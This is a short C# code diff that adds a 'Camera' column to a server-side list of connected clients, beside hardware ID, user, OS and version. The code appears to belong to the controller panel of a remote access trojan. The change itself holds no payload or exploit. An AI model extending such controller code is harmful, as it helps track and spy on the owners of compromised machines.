@@ -60,6 +60,7 @@ namespace Server.Handle_Packet
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
+                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                 try
